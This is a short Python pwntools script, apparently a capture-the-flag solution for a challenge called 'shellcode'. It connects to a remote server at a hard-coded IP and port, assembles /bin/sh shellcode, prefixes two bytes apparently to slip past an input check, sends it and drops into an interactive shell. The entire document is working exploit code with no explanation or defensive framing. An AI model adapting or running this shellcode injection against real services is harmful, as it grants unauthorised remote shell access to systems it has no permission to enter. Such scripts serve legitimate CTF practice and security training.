from pwn import *
context.log_level = 'debug'

p = process("shellcode")
p = remote("34.92.37.22",10002)

if __name__=='__main__':

	context(os='linux',arch='amd64')
	shellcode = asm(shellcraft.sh())

	shellcode = '\x00\x02'+shellcode
	p.recvuntil("give me shellcode, plz:")
	#gdb.attach(p)
	p.send(shellcode)
	p.interactive()
